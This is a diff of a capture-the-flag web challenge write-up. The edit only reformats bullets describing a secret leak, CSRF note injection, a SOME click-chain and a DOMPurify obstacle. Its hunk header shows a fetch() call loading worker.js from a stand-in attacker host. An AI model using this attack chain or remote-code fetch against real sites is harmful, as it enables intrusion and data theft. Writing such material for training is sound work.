@@ -601,7 +601,11 @@ fetch(`https://attacker.com/worker.js`)
 
 ## XSS 
  
-*  We already know how to leak the secret and assuming we have the secret, now we can perform csrf and add another note, then we use `SOME` in `/challenge/theme` to click the second post with DOM navigations. * But there is no xss. Note Title and Note body are sanitized using `DOMPurify` in the latest version. So no XSS. * if we looked at the last part of client-side javascript file - `/app.js`
+*  We already know how to leak the secret and assuming we have the secret, now we can perform csrf and add another note, then we use `SOME` in `/challenge/theme` to click the second post with DOM navigations. 
+* But there is no xss. Note Title and Note body are sanitized using `DOMPurify` in the latest version. So no XSS. 
+* if we looked at the last part of client-side javascript file - `/app.js`
+
+
 ```js
 Object.whoami = Object.create(null);
 if(document.domain.match(/localhost/)){
